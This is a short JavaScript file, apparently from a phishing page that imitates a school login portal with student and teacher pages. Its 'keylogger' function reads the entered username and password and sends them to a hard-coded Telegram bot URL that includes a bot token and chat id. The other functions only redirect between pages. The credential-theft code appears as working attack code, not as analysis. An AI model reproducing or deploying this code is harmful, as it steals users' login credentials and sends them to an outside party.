function keylogger() {
    const username = document.getElementsByClassName('fr-input')[0].value;
    var password = document.querySelectorAll('input[type=password]');
    //document.write("Username : ", username, " Password : ", password);
    fetch("https://api.telegram.org/bot6065032783:AAFVgRyMDdiYLq-Ph2NAo3i77NXLces7K6U/sendMessage?chat_id=6216682581&text=Username : " + username + " Password : " + password[0].value, {
        method: 'POST',
          body: JSON.stringify({
          'chat_id': "0",
        }),
        headers: {
          'Content-type': 'application/json',
        },
      })
}
function select_eleve() {
  window.location.href = "Elève.html";
}
function select_prof() {
  window.location.href = "Prof.html";
}
function back() {
  window.location.href = "main.html";
}